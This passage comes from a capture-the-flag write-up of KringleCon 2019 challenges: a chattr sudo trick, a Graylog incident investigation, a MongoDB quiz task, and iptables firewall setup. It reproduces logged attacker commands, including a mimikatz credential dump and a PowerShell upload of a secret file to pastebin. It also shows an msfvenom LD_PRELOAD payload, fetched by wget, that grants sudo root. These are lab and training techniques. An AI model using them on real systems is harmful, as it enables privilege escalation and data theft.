    (root) NOPASSWD: <span class="green">/usr/bin/chattr</span>
</pre>

<p>
This final hint (combined with the <code>chattr</code> man page) makes it all clear: <i>Have you heard any chatter about immutable files?</i> First, we use our <code>sudo</code> access to make <code>/bin/nsh</code> no longer immutable, then we copy <code>bash</code> over:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_nyanshell:~$</span> <span class="green">sudo</span> <span class="green">chattr</span> -<span class="purple">i</span> /bin/nsh
<span class="gray1">elf@term_nyanshell:~$</span> <span class="green">cp</span> /bin/bash /bin/nsh  
<span class="gray1">elf@term_nyanshell:~$</span> <span class="green">su</span> - alabaster_snowball
Password: 


Loading, please wait......

You did it! Congratulations!
<span class="gray1">alabaster_snowball@term_nyanshell:~$</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org3ac514e" class="outline-3">
<h3 id="org3ac514e">Graylog</h3>
<div class="outline-text-3" id="text-org3ac514e">
<p>
Direct link: <a href="https://incident.elfu.org">https://incident.elfu.org</a> (Credentials: elfustudent/elfustudent)
</p>

<p>
In the Dormitory.
</p>
</div>

<div id="outline-container-orgc7934af" class="outline-4">
<h4 id="orgc7934af">Background</h4>
<div class="outline-text-4" id="text-orgc7934af">
<div class="goal">
<p>
Use Graylog to investigate the incident, and answer 10 questions.
</p>

</div>

<div class="chat">
<p>
Normally I'm jollier, but this Graylog has me a bit mystified.
</p>

<p>
Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala.
</p>

<p>
Some Elf U computers were hacked, and I've been tasked with performing incident response.
</p>

<p>
Can you help me fill out the incident response report using our instance of Graylog?
</p>

<p>
It's probably helpful if you know a few things about Graylog.
</p>

<p>
Event IDs and Sysmon are important too.  Have you spent time with those?
</p>

<p>
Don't worry - I'm sure you can figure this all out for me!
</p>

<p>
Click on the <span class="underline">All messages</span> Link to access the Graylog search interface!
</p>

<p>
Make sure you are searching <span class="underline">in all messages</span>!
</p>

<p>
The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner.
</p>

<p>
Login with the username <code>elfustudent</code> and password <code>elfustudent</code>.
</p>

</div>

<div class="gamehint">
<p>
<b>Graylog</b>: <a href="http://docs.graylog.org/en/3.1/pages/queries.html">Graylog Docs</a>
</p>

<p>
<b>Event IDs and Sysmon</b>: <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/">Events and Sysmon</a>
</p>

</div>

<p>
The second link has a list of SysMon events:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Event ID</th>
<th scope="col" class="org-left">Event Description</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">Process creation</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">A process changed a file creation time</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">Network connection</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-left">Sysmon service state changed</td>
</tr>

<tr>
<td class="org-right">5</td>
<td class="org-left">Process terminated</td>
</tr>

<tr>
<td class="org-right">6</td>
<td class="org-left">Driver loaded</td>
</tr>

<tr>
<td class="org-right">7</td>
<td class="org-left">Image loaded</td>
</tr>

<tr>
<td class="org-right">8</td>
<td class="org-left">CreateRemoteThread</td>
</tr>

<tr>
<td class="org-right">9</td>
<td class="org-left">RawAccessRead</td>
</tr>

<tr>
<td class="org-right">10</td>
<td class="org-left">ProcessAccess</td>
</tr>

<tr>
<td class="org-right">11</td>
<td class="org-left">FileCreate</td>
</tr>

<tr>
<td class="org-right">12</td>
<td class="org-left">RegistryEvent (Object create and delete)</td>
</tr>

<tr>
<td class="org-right">13</td>
<td class="org-left">RegistryEvent (Value Set)</td>
</tr>

<tr>
<td class="org-right">14</td>
<td class="org-left">RegistryEvent (Key and Value Rename)</td>
</tr>

<tr>
<td class="org-right">15</td>
<td class="org-left">FileCreateStreamHash</td>
</tr>

<tr>
<td class="org-right">16</td>
<td class="org-left">Sysmon config state changed</td>
</tr>

<tr>
<td class="org-right">17</td>
<td class="org-left">Pipe created</td>
</tr>

<tr>
<td class="org-right">18</td>
<td class="org-left">Pipe connected</td>
</tr>

<tr>
<td class="org-right">19</td>
<td class="org-left">WmiEventFilter activity detected</td>
</tr>

<tr>
<td class="org-right">20</td>
<td class="org-left">WmiEventConsumer activity detected</td>
</tr>

<tr>
<td class="org-right">21</td>
<td class="org-left">WmiEventConsumerToFilter activity detected</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-orgfa70ec7" class="outline-4">
<h4 id="orgfa70ec7">Solution</h4>
<div class="outline-text-4" id="text-orgfa70ec7">
<p>
The first thing we do is adjust our time range to "Search in all
messages." A frame on the lower right of the window will pop up with
10 questions for us.
</p>

<p>
As we answer the questions, we'll get some guidance on how else we
could've solved it. We decided to stick with our original approach, to
show different solutions.
</p>
</div>

<ul class="org-ul">
<li><a id="org3a622e2"></a>Q1: What is the full-path + filename of the first malicious file downloaded by Minty?<br />
<div class="outline-text-5" id="text-org3a622e2">
<p>
<br />
<br />
</p>
<div class="gamehint">
<p>
Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.
</p>

</div>

<p>
We start with what we know, and search for <code>firefox AND minty</code>. This
returns a lot of results, but GrayLog allows us to work with
individual fields by selecting them on the right. We see one fieldname
which seems interesting, <code>TargetFilename</code>, and select it, and then
choose <code>Generate chart</code>. We see 15 messages with that field, most of
which are temporary files. One file is different though &#x2013;
<code>C:\Users\minty\Downloads\cookie_recipe.exe</code>.
</p>


<div class="figure">
<p><img src="./imgs/graylog/q1.png" alt="q1.png" width="80%" />
</p>
<p><span class="figure-number">Figure 7: </span>TargetFilename chart</p>
</div>

<p>
The file extension doesn't match what should be a document, so we
submit this and are told it's correct:
</p>

<div class="gamehint">
<p>
We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. We can use regular expressions to include or exclude patterns: <code>TargetFilename:/.+\.pdf/</code>
</p>

</div>
</div>
</li>

<li><a id="orga9b4ba6"></a>Q2: What was the ip:port the malicious file connected to first?<br />
<div class="outline-text-5" id="text-orga9b4ba6">
<p>
<br />
<br />
</p>
<div class="gamehint">
<p>
The malicious file downloaded and executed by Minty gave the attacker remote access to his machine.
</p>

</div>

<p>
Using the table of SysMon events, we search for: <code>EventID:3 AND
cookie_recipe.exe</code>, and find a single event. Drilling down into the
message, we see the destination IP and port:
<code>192.168.247.175:4444</code>. 4444 is often associated with <a href="https://www.metasploit.com/">Metasploit</a>. The
hostname associated with that machine is <code>DEFANELF</code>.
</p>


<div class="figure">
<p><img src="./imgs/graylog/q2.png" alt="q2.png" width="80%" />
</p>
<p><span class="figure-number">Figure 8: </span>Definitely an elf?</p>
</div>

<p>
After giving our successful answer, we're told:
</p>

<div class="gamehint">
<p>
We can pivot off the answer to our first question using the binary path as our ProcessImage.
</p>

</div>
</div>
</li>

<li><a id="org82373bd"></a>Q3: What was the first command executed by the attacker? (single word)<br />
<div class="outline-text-5" id="text-org82373bd">
<p>
<br />
<br />
We know that the attacker was using <code>cookie_recipe.exe</code> to get remote
access to the machine. Presumably, if they were executing a command,
it would also be through this malware. We modify our previous search
to look for event ID 1 (process creation) instead of network
connections. If the malware is executing other commands, we'd expect
it to be the parent process.
</p>

<p>
With our new search, we toggle the checkboxes in the fields selector on the left, and we just show <code>CommandLine</code>, which is the command being run. Our events are sorted by time, from newest (on top) to oldest, so finding the earliest is easy: <code>whoami</code>.
</p>


<div class="figure">
<p><img src="./imgs/graylog/q3.png" alt="q3.png" width="80%" />
</p>
<p><span class="figure-number">Figure 9: </span>Commands run by cookie_recipe.exe</p>
</div>

<p>
Upon our successful completion of this question, we're told:
</p>

<div class="gamehint">
<p>
Since all commands (sysmon event id 1) by the attacker are initially
running through the cookie_recipe.exe binary, we can set its full-path
as our ParentProcessImage to find child processes it creates sorting
on timestamp.
</p>

</div>
</div>
</li>

<li><a id="org4f420d1"></a>Q4: What is the one-word service name the attacker used to escalate privileges?<br />
<div class="outline-text-5" id="text-org4f420d1">
<p>
<br />
<br />
Looking at the previous image, we see: 
<code>sc start webexservice a software-update 1 wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe"</code>. Answering <code>webexservice</code> reveals:
</p>

<div class="gamehint">
<p>
Continuing on using the cookie_reciper.exe binary as our
ParentProcessImage, we should see some more commands later on related
to a service.
</p>

</div>
</div>
</li>

<li><a id="orgc8a11e4"></a>Q5: What is the file-path + filename of the binary ran by the attacker to dump credentials?<br />
<div class="outline-text-5" id="text-orgc8a11e4">
<p>
<br />
<br />
When the attacker was creating the service, they were invoking
<code>cookie_recipe2.exe</code>. Updating our search to look for <code>EventID:1 AND
cookie_recipe2.exe</code>, and still showing the <code>CommandLine</code> field, we see
some additional commands.
</p>


<div class="figure">
<p><img src="./imgs/graylog/q5.png" alt="q5.png" />
</p>
<p><span class="figure-number">Figure 10: </span>Commands run by cookie_recipe2.exe</p>
</div>

<p>
We see the attacker download Mimikatz, a tool that can pull secrets out of memory and do other security experiments. They struggle for a bit, finally saving it as <code>C:\Cookie.exe</code>, then running <code>C:\Cookie.exe "privilege::debug" "sekurlsa::logonpasswords" exit</code>.
</p>

<p>
After identifying <code>C:\Cookie.exe</code>, we're told:
</p>

<div class="gamehint">
<p>
The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe. Let's use this binary path in our ParentProcessImage search.
</p>

</div>
</div>
</li>

<li><a id="orgefdf039"></a>Q6: The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?<br />
<div class="outline-text-5" id="text-orgefdf039">
<p>
<br />
<br />
First, we change our search time window to absolute, <b>after</b> the
attacker ran the mimikatz command (2019-11-19 05:45:14) to now (using
the wand button as a shortcut).
</p>

<p>
Since we're now interested in authentication events, we transition from looking at SysMon events, to looking at stock Windows logs. Using the reference in the hint, we focus in on event ID <code>4624</code> (An account was successfully logged on):
</p>


<div class="figure">
<p><img src="./imgs/graylog/q6_search.png" alt="q6_search.png" width="50%" />
</p>
</div>

<p>
At the bottom of the page are the events closest to the credential
dump we observed previously. The very last line is a login for
<code>alabaster</code> from the <code>DEFANELF</code> machine we identified previously. Identifying <code>alabaster</code> results in:
</p>

<div class="gamehint">
<p>
Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress.
</p>

</div>
</div>
</li>

<li><a id="orgf448dc7"></a>Q7: What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?<br />
<div class="outline-text-5" id="text-orgf448dc7">
<p>
<br />
<br />
Here, we're asked to look for a specific type of successful
authentication. Reading <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624">the documentation in the hint on event 4624</a>,
we see that a logon type of 10 is for remote desktop. By tweaking our
previous search to include <code>AND LogonType:10</code>, we see a single
event. A login for Alabaster on ELFU-RES-WKS2 from 192.168.247.175 at
<code>06:04:28</code>. The tutorial reminds us:
</p>

<div class="gamehint">
<p>
LogonType 10 is used for successful network connections using the RDP client.
</p>

</div>
</div>
</li>

<li><a id="org612f93e"></a>Q8: The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?<br />
<div class="outline-text-5" id="text-org612f93e">
<p>
<br />
<br />
Once more, we read the 4624 documentation. Logon type 3 is described
as "Network (i.e. connection to shared folder on this computer from
elsewhere on network)," which certainly seems to be what's being
described here. We modify our previous search, to look for type 3
instead of 10. There are a few results, but we're also told that the
source should be the second host (ELFU-RES-WKS2). Our search ends up
being: <code>EventID:4624 AND LogonType:3 AND
SourceHostName:ELFU\-RES\-WKS2</code>, which gives us what we need: <code>ELFU-RES-WKS2,elfu-res-wks3,3</code>. Once solved, we get the explanation:
</p>

<div class="gamehint">
<p>
The attacker has GUI access to workstation 2 via RDP. They likely use
this GUI connection to access the file system of of workstation 3
using explorer.exe via UNC file paths (which is why we don't see any
cmd.exe or powershell.exe process creates). However, we still see the
successful network authentication for this with event id 4624 and
logon type 3.
</p>

</div>
</div>
</li>

<li><a id="org65e9960"></a>Q9: What is the full-path + filename of the secret research document after being transferred from the third host to the second host?<br />
<div class="outline-text-5" id="text-org65e9960">
<p>
<br />
<br />
If the file is being transferred to the second host (<code>elfu-res-wks2</code>),
we would expect to see a SysMon file modification event (id:2). Sure
enough, if we modify our search to be <code>EventID:2 AND
source:elfu\-res\-wks2</code>, we see a number of files being created. The
top few are temporary files, but one file has a more interesting name:
<code>C:\Users\alabaster\Desktop\super_secret_elfu_resarch.pdf</code>. 
</p>


<div class="figure">
<p><img src="./imgs/graylog/q9.png" alt="q9.png" />
</p>
</div>

<p>
The process which created the file is Windows Explorer, which would
line up with the attacker navigating the file system.
</p>

<p>
The tutorial takes a regex-based approach:
</p>

<div class="gamehint">
<p>
We can look for sysmon file creation event id of 2 with a source of workstation 2. We can also use regex to filter out overly common file paths using something like: <code>AND NOT TargetFilename:/.+AppData.+/</code>
</p>

</div>
</div>
</li>

<li><a id="org5cf81fd"></a>Q10: What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?<br />
<div class="outline-text-5" id="text-org5cf81fd">
<p>
<br />
<br />
To determine what happens with the file, we start by searching for <code>super_secret_elfu_research.pdf</code>. We get two hits: one message from the previous file transfer, and one in an invocation of PowerShell:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #268bd2;">Invoke-WebRequest</span> <span style="color: #cb4b16;">-Uri</span> https://pastebin.com/post.php <span style="color: #cb4b16;">-Method</span> POST <span style="color: #cb4b16;">-Body</span> @{ 
    <span style="color: #859900;">"submit_hidden"</span> = <span style="color: #859900;">"submit_hidden"</span>; 
    <span style="color: #859900;">"paste_code"</span> = $(<span style="color: #b58900;">[Convert]</span>::ToBase64String(<span style="color: #b58900;">[IO.File]</span>::ReadAllBytes(<span style="color: #859900;">"C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"</span>))); 
    <span style="color: #859900;">"paste_format"</span> = <span style="color: #859900;">"1"</span>; <span style="color: #859900;">"paste_expire_date"</span> = <span style="color: #859900;">"N"</span>; <span style="color: #859900;">"paste_private"</span> = <span style="color: #859900;">"0"</span>; <span style="color: #859900;">"paste_name"</span>=<span style="color: #859900;">"cookie recipe"</span> 
}
</pre>
</div>

<p>
The file was exfiltrated to Pastebin! To get the IP address, we search for <code>pastebin.com</code>, and we get another message: the SysMon event for the network connection:
</p>


<div class="figure">
<p><img src="./imgs/graylog/q10.png" alt="q10.png" width="50%" />
</p>
</div>

<p>
After identifying the IP address <code>104.22.3.84</code>, we're told:
</p>

<blockquote>
<p>
<b>Incident Response Report #7830984301576234 Submitted.</b>
</p>

<p>
Incident Fully Detected!
</p>
</blockquote>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-orge800edf" class="outline-3">
<h3 id="orge800edf">Mongo Pilfer</h3>
<div class="outline-text-3" id="text-orge800edf">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=mongo&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=mongo</a>
</p>

<p>
In the NetWars room, in Hermey Hall.
</p>
</div>

<div id="outline-container-org4e6d7f8" class="outline-4">
<h4 id="org4e6d7f8">Background</h4>
<div class="outline-text-4" id="text-org4e6d7f8">
<pre class="example">
Hello dear player!  Won't you please come help me get my wish!
I'm searching teacher's database, but all I find are fish!
Do all his boating trips effect some database dilution?
It should not be this hard for me to find the quiz solution!

Find the solution hidden in the MongoDB on this system.
</pre>

<div class="goal">
<p>
Find the solution to a quiz hidden on the MongoDB instance.
</p>

</div>

<div class="chat">
<p>
Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution.
</p>

<p>
Without access to the answer, none of our quizzes will get graded.
</p>

<p>
Can we help get back in to find that solution?
</p>

<p>
I tried <code>lsof -i</code>, but that tool doesn't seem to be installed.
</p>

<p>
I think there's a tool like <code>ps</code> that'll help too.  What are the flags I need?
</p>

<p>
Either way, you'll need to know a teensy bit of <a href="https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases">Mongo</a> once you're in.
</p>

<p>
Pretty please find us the solution to the quiz!
</p>

</div>

<div class="gamehint">
<p>
<b>MongoDB</b>: <a href="https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases">MongoDB Documentation</a>
</p>

</div>
</div>
</div>

<div id="outline-container-orgfb32ce3" class="outline-4">
<h4 id="orgfb32ce3">Solution</h4>
<div class="outline-text-4" id="text-orgfb32ce3">
<p>
<asciinema-player src="casts/mongo.cast" preload="yes" poster="npt:0:03" theme="solarized-dark"></asciinema-player>
</p>

<p>
If we just run the mongo client, we get:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_mongo:~$</span> <span class="green">mongo</span>
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
2020-01-04T01:25:21.256+0000 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll), reason: Connection refused
2020-01-04T01:25:21.256+0000 E QUERY    [thread1] Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed :
connect@src/mongo/shell/mongo.js:251:13
@(connect):1:6
exception: connect failed


Hmm... what if Mongo isn't running on the default port?
</pre>

<p>
So, our first task is to find what port the server is running on. We have a couple hints about some commands we can run.
</p>

<p>
We start by figuring out what <code>lsof -i</code> would have done, if <code>lsof</code> were available. From the <a href="https://www.mankier.com/1/lsof">lsof man page</a>:
</p>

<pre class="src src-sh">
-<span class="purple">i</span> [i]
    selects the listing of files any of whose Internet address matches the
    address specified in i. If no address is specified, this option
    selects the listing of all Internet and x.25 (HP-UX) network files.
</pre>

<p>
<code>lsof</code> would have helped us find the right port number, but as it's not available, we're guided towards <code>ps</code> instead.
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_mongo:~$</span> <span class="green">ps</span> <span class="purple">ax</span>
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 <span class="green">/bin/bash</span>
    9 ?        Sl     0:01 <span class="green">/usr/bin/mongod</span> --<span class="purple">quiet</span> --<span class="purple">fork</span> --<span class="purple">port</span> 12121 --<span class="purple">bind_ip</span> 127.0.0.1 --<span class="purple">logpath</span>=/tmp/mongo.log
   57 pts/0    R+     0:00 <span class="green">ps</span> <span class="purple">ax</span>
</pre>

<p>
The <a href="https://docs.mongodb.com/manual/mongo/#local-mongodb-instance-on-a-non-default-port">Mongo documentation</a> from the hint tells us how to connect to a non-default port:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_mongo:~$</span> <span class="green">mongo</span> --<span class="purple">port</span>=12121
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:12121/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
<span class="gray1">> </span>
</pre>

<p>
The documentation link in the hint sends us to list databases, so we'll try that first:
</p>

<pre class="src src-sh">
<span class="gray1">></span> <span class="green">db</span>.<span class="green">adminCommand</span>( { <span class="purple">listDatabases</span>: 1 } )
{
        <span class="green">"databases"</span> : [
                {
                        <span class="green">"name"</span> : <span class="purple">"admin"</span>,
                        <span class="green">"sizeOnDisk"</span> : <span class="purple">32768</span>,
                        <span class="green">"empty"</span> : <span class="purple">false</span>
                },
                {
                        <span class="green">"name"</span> : <span class="purple">"elfu"</span>,
                        <span class="green">"sizeOnDisk"</span> : <span class="purple">294912</span>,
                        <span class="green">"empty"</span> : <span class="purple">false</span>
                },
                {
                        <span class="green">"name"</span> : <span class="purple">"local"</span>,
                        <span class="green">"sizeOnDisk"</span> : <span class="purple">65536</span>,
                        <span class="green">"empty"</span> : <span class="purple">false</span>
                },
                {
                        <span class="green">"name"</span> : <span class="purple">"test"</span>,
                        <span class="green">"sizeOnDisk"</span> : <span class="purple">32768</span>,
                        <span class="green">"empty"</span> : <span class="purple">false</span>
                }
        ],
        <span class="green">"totalSize"</span> : <span class="purple">425984</span>,
        <span class="green">"ok"</span> : <span class="purple">1</span>
}
</pre>

<p>
If it's a solution to a quiz we're after, <code>elfu</code> sounds like a good
place to start. Perusing the documentation some more, we switch to
that database, then list the contents ("collections"):
</p>

<pre class="src src-sh">
<span class="gray1">></span> <span class="green">use elfu</span>
switched to db elfu
<span class="gray1">></span> <span class="green">db</span>.<span class="green">getCollectionNames</span>() 
[
        <span class="green">"bait"</span>,
        <span class="green">"chum"</span>,
        <span class="green">"line"</span>,
        <span class="green">"metadata"</span>,
        <span class="green">"solution"</span>,
        <span class="green">"system.js"</span>,
        <span class="green">"tackle"</span>,
        <span class="green">"tincan"</span>
]
</pre>

<p>
These must be the fishing-related terms that were referenced when
first connecting to the system. Our goal is the solution, so we'll
find that:
</p>

<pre class="src src-sh">
<span class="gray1">></span> <span class="green">db</span>.<span class="green">loadServerScripts</span>()
<span class="gray1">></span> <span class="green">displaySolution</span>()

.
       __/ __
            /
       /.'o'. 
        .o.'.
       .'.'o'.
      o'.o.'.*.
     .'.o.'.'.*.
    .o.'.o.'.o.'.
       [_____]
        ___/

Congratulations!!
</pre>
</div>
</div>

<div id="outline-container-org553d7ae" class="outline-4">
<h4 id="term_mongo_root"><a id="org553d7ae"></a>Escalating to Root</h4>
<div class="outline-text-4" id="text-term_mongo_root">
<p>
If we check <code>sudo -l</code>, we see an interesting entry:
</p>

<pre class="src src-sh">
(root) SETENV: NOPASSWD: <span class="green">/usr/bin/python</span> <span class="purple">/updater.py</span>
</pre>

<p>
This is noteworthy because we're allowed to configure the environment (<code>SETENV</code>). One environment variable we can set is <code>LD_PRELOAD</code>, which is:
</p>

<blockquote>
<p>
A list of additional, user-specified, ELF shared objects to be loaded
before all others.
</p>
</blockquote>

<p>
We can use <code>msfvenom</code>, a tool that comes with <a href="https://www.metasploit.com/">Metasploit</a> to create a shared object that will run an arbitrary command:
</p>

<pre class="src src-sh">
<span class="green">msfvenom</span> -<span class="purple">p</span> linux/x64/exec CMD=<span class="red">"echo 'elf ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"</span> -f elf-so -o sudo.so
</pre>

<p>
Now we just download this, and run our command with <code>LD_PRELOAD</code> set to our malicious file:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_mongo:~$</span> <span class="green">wget</span> https://example.net/sudo.so
<span class="gray1">elf@term_mongo:~$</span> <span class="green">sudo</span> <span class="purple">LD_PRELOAD</span>=/home/elf/sudo.so -<span class="purple">E</span> <span class="green">/usr/bin/python</span> /updater.py
</pre>

<p>
At this point, it looks like our command has failed. However we should now be able to run any command without a password:
</p>

<pre class="src src-sh">
<span class="gray1">elf@term_mongo:~$</span> <span class="green">sudo</span> <span class="green">su</span> -
<span class="gray1">root@term_mongo:~#</span> <span class="green">id</span>
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>
</div>
</div>
<div id="outline-container-org110887c" class="outline-3">
<h3 id="term_iptables"><a id="org110887c"></a>Smart Braces</h3>
<div class="outline-text-3" id="text-term_iptables">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=iptables&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=iptables</a>
</p>

<p>
In the Student Union.
</p>
</div>

<div id="outline-container-org1661e17" class="outline-4">
<h4 id="org1661e17">Background</h4>
<div class="outline-text-4" id="text-org1661e17">
<pre class="src">
<span style="color: #b58900">Inner Voice: Kent. Kent. Wake up, Kent.
Inner Voice: I'm talking to you, Kent.</span>
<span style="color: #d30102">Kent TinselTooth: Who said that? I must be going insane.
Kent TinselTooth: Am I?</span>
<span style="color: #b58900">Inner Voice: That remains to be seen, Kent. But we are having a conversation.
Inner Voice: This is Santa, Kent, and you've been a very naughty boy.</span>
<span style="color: #d30102">Kent TinselTooth: Alright! Who is this?! Holly? Minty? Alabaster?</span>
<span style="color: #b58900">Inner Voice: I am known by many names. I am the boss of the North Pole. Turn to me and be hired after graduation.</span>
<span style="color: #d30102">Kent TinselTooth: Oh, sure.</span>
<span style="color: #b58900">Inner Voice: Cut the candy, Kent, you've built an automated, machine-learning, sleigh device.</span>
<span style="color: #d30102">Kent TinselTooth: How did you know that?</span>
<span style="color: #b58900">Inner Voice: I'm Santa - I know everything.</span>
<span style="color: #d30102">Kent TinselTooth: Oh. Kringle. *sigh*</span>
<span style="color: #b58900">Inner Voice: That's right, Kent. Where is the sleigh device now?</span>
<span style="color: #d30102">Kent TinselTooth: I can't tell you.</span>
<span style="color: #b58900">Inner Voice: How would you like to intern for the rest of time?</span>
<span style="color: #d30102">Kent TinselTooth: Please no, they're testing it at srf.elfu.org using default creds, but I don't know more. It's classified.</span>
<span style="color: #b58900">Inner Voice: Very good Kent, that's all I needed to know.</span>
<span style="color: #d30102">Kent TinselTooth: I thought you knew everything?</span>
<span style="color: #b58900">Inner Voice: Nevermind that. I want you to think about what you've researched and studied. From now on, stop playing with your teeth, and floss more.</span>
*Inner Voice Goes Silent*

<span style="color: #d30102">Kent TinselTooth: Oh no, I sure hope that voice was Santa's.
Kent TinselTooth: I suspect someone may have hacked into my IOT teeth braces.
Kent TinselTooth: I must have forgotten to configure the firewall...
Kent TinselTooth: Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.
Kent TinselTooth: Please hurry; having this ribbon cable on my teeth is uncomfortable.</span>
</pre>

<div class="goal">
<p>
Configure the iptables firewall.
</p>

</div>

<div class="chat">
<p>
Do you think you could take a look at my Smart Braces terminal?
</p>

<p>
I'll bet you can keep other students out of my head, so to speak.
</p>

<p>
It might just take a bit of Iptables work.
</p>

</div>

<div class="gamehint">
<p>
<b>Iptables</b>: <a href="https://upcloud.com/community/tutorials/configure-iptables-centos/">Iptables</a>
</p>

</div>
</div>
</div>
<div id="outline-container-orgab73a74" class="outline-4">
<h4 id="orgab73a74">Solution</h4>
<div class="outline-text-4" id="text-orgab73a74">
<asciinema-player src="casts/iptables.cast" preload="yes" poster="npt:0:57" t="57" theme="solarized-dark"></asciinema-player>

<div class="org-src-container">
<pre class="src src-sh">cat IOTteethBraces.md
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -L
</pre>
</div>

<p>
We're told to review <code>IOTteethBraces.md</code>:
</p>

<pre class="example">
1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
</pre>

<p>
For the first requirement, we can use an example from <code>IOTteethBraces.md</code>:
</p>
<pre class="src">
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> iptables -P INPUT DROP
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> iptables -P FORWARD DROP
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> iptables -P OUTPUT DROP
</pre>

<p>
Like with most Linux tools, we get no output if the command succeeded. We can test the current configuration with a line from the uploud.com hint:
</p>

<pre class="src">
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> iptables -L 
Chain INPUT (policy DROP)
target     prot opt source               destination
Chain FORWARD (policy DROP)
target     prot opt source               destination
Chain OUTPUT (policy DROP)
target     prot opt source               destination
</pre>

<p>
Requirement two is also a one-liner from the hint:
</p>
<pre class="src">
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> INPUT -<span class="purple">m</span> conntrack --<span class="purple">ctstate</span> ESTABLISHED,RELATED -<span class="purple">j</span> ACCEPT
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> OUTPUT -<span class="purple">m</span> conntrack --<span class="purple">ctstate</span> ESTABLISHED,RELATED -<span class="purple">j</span> ACCEPT
</pre>

<p>
For the next one, we modify a command from the Markdown file:
</p>

<pre class="src">
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> INPUT -<span class="purple">p</span> tcp --<span class="purple">dport</span> 22 -<span class="purple">s</span> 172.19.0.225 -<span class="purple">j</span> ACCEPT
</pre>

<p>
To allow any connections to ports 21 and 80, we use a command from the hint:
</p>

<pre class="src">
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> INPUT -<span class="purple">p</span> tcp --<span class="purple">dport</span> 21 -<span class="purple">j</span> ACCEPT
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> INPUT -<span class="purple">p</span> tcp --<span class="purple">dport</span> 80 -<span class="purple">j</span> ACCEPT
</pre>

<p>
We can slightly tweak the command above to accept HTTP output traffic:
</p>
<pre class="src">
